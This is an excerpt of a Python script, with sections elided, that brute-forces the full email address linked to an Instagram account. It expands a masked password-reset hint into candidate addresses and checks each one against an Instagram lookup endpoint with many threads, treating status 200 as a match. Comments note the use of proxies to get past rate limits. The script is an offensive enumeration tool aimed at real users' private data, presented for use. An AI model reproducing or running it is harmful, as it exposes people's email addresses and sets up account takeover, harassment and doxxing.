...
class Worker(threading.Thread):
    ...
    def __init__(self, job_queue, max_retries=10):
        ...
        # This is filled with the Instagram emails to check.
    ...
    def run(self):
        ...
        while True:
            ...
            # Retrieves a "brute" email from "job_queue".
            brute = self._job_queue.get()

            # Breaks loop when "None" is retrieved from "job_queue".
            # A matching email was not found.
            if brute is None:
                break
            ...
            while retries < self._max_retries:
                try:
                    ...
                    data = "signed_body=SIGNATURE." + quote_plus(json.dumps({"q": brute, "skip_recovery": "1"}, separators=(",", ":")))
                    ...
                    # Make the request, completing account check.
                    ...
                    # Status code: 404 = Normal, email was not found
                    if response.status_code == 404:
                        print(f"Wrong email: {brute}", "-", colored(f"Status Code: {response.status_code}", "yellow"))

                        # Exits the retry loop because a successful check was completed.
                        break

                    # Status code: 200 = Normal, email was found linked to a username
                    elif response.status_code == 200:
                        print(f"Matched email: {brute}", "-", colored(f"Status Code: {response.status_code}", "green"))
                    ...
                    # Status code: 429 = Your proxies are low quality/failed check
                    else:
                        print(f"Failed check: {brute}", "-", colored(f"Status Code: {response.status_code}", "red"))
...
if __name__ == '__main__':
    ...
    # List that includes all the possible emails based on the schema
    emails = []

    # Edit to match the email schema provided by the password reset hint
    # Example: Password reset sent to j*e@aol.com
    # -----------------------------------------------------------------------------
    letters = 'abcdefghijklmnopqrstuvwxyz'

    for letter1 in letters:
        for letter2 in letters:
            emails.append(f"john{letter1}{letter2}doe@aol.com")
    # -----------------------------------------------------------------------------
